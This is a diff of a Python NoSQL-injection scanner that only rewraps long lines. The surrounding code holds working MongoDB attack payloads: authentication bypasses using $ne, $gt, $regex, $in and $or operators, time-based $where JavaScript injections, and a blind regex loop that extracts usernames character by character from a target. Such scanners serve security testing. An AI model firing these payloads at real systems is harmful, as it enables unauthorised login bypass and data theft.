@@ -46,13 +46,22 @@ AUTH_PAYLOADS = [
     ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "GT_BYPASS"),
     ({"username": {"$exists": True}, "password": {"$exists": True}}, "EXISTS_BYPASS"),
     ({"username": "admin", "password": {"$regex": ".*"}}, "REGEX_WILDCARD"),
-    ({"username": {"$in": ["admin", "administrator", "root", "test"]}, "password": {"$ne": ""}}, "IN_BYPASS"),
+    (
+        {
+            "username": {"$in": ["admin", "administrator", "root", "test"]},
+            "password": {"$ne": ""},
+        },
+        "IN_BYPASS",
+    ),
     ({"username": {"$nin": ["nonexistent"]}, "password": {"$nin": [""]}}, "NIN_BYPASS"),
     ({"username": {"$lt": "z"}, "password": {"$lt": "z"}}, "LT_BYPASS"),
     # Type coercion
     ({"username": {"$type": 2}, "password": {"$ne": ""}}, "TYPE_COERCE"),
     # OR injection
-    ({"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}, "OR_INJECTION"),
+    (
+        {"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}},
+        "OR_INJECTION",
+    ),
 ]
 
 # ──────────── GET PARAMETER INJECTION ────────────
@@ -81,11 +90,19 @@ WHERE_PAYLOADS = [
 SSJI_TIME_PAYLOADS = [
     ({"$where": "sleep(5000)"}, "SSJI_SLEEP", 4.0),
     (
-        {"$where": "function() { var x = new Date(); while(new Date() - x < 5000); return true; }"},
+        {
+            "$where": "function() { var x = new Date(); while(new Date() - x < 5000); return true; }"
+        },
         "SSJI_BUSY_WAIT",
         4.0,
     ),
-    ({"$where": "(function(){var d=new Date();while(new Date()-d<5000){}return true;})()"}, "SSJI_IIFE_WAIT", 4.0),
+    (
+        {
+            "$where": "(function(){var d=new Date();while(new Date()-d<5000){}return true;})()"
+        },
+        "SSJI_IIFE_WAIT",
+        4.0,
+    ),
 ]
 
 # ──────────── BLIND BOOLEAN EXTRACTION ────────────
@@ -161,12 +178,19 @@ def _test_get_injection(target, endpoint, baseline_len):
     vulns = []
     for suffix, method in GET_PAYLOADS:
         try:
-            resp = requests.get(f"http://{target}{endpoint}?username{suffix}&password{suffix}", timeout=5)
+            resp = requests.get(
+                f"http://{target}{endpoint}?username{suffix}&password{suffix}",
+                timeout=5,
+            )
             resp_len = len(resp.text)
             tolerance = max(baseline_len * 0.05, 50)
             diff_from_baseline = abs(resp_len - baseline_len)
 
-            if resp.status_code == 200 and resp_len > 100 and diff_from_baseline > tolerance:
+            if (
+                resp.status_code == 200
+                and resp_len > 100
+                and diff_from_baseline > tolerance
+            ):
                 vulns.append(
                     {
                         "tipo": "NOSQL_GET_INJECTION",
@@ -200,7 +224,11 @@ def _test_where_injection(target, endpoint, baseline_latency, baseline_len):
             tolerance = max(baseline_len * 0.05, 50)
             diff_from_baseline = abs(resp_len - baseline_len)
 
-            if resp.status_code == 200 and resp_len > 50 and diff_from_baseline > tolerance:
+            if (
+                resp.status_code == 200
+                and resp_len > 50
+                and diff_from_baseline > tolerance
+            ):
                 vulns.append(
                     {
                         "tipo": "NOSQL_WHERE_INJECTION",
@@ -303,8 +331,16 @@ def _test_blind_boolean(target, endpoint):
             extracted = ""
             for _pos in range(3):
                 for char in CHARSET:
-                    probe = {"username": {"$regex": f"^{extracted}{char}"}, "password": {"$ne": ""}}
-                    resp = requests.post(url, json=probe, timeout=4, headers={"Content-Type": "application/json"})
+                    probe = {
+                        "username": {"$regex": f"^{extracted}{char}"},
+                        "password": {"$ne": ""},
+                    }
+                    resp = requests.post(
+                        url,
+                        json=probe,
+                        timeout=4,
+                        headers={"Content-Type": "application/json"},
+                    )
                     if len(resp.text) == len(r_true.text):
                         extracted += char
                         break
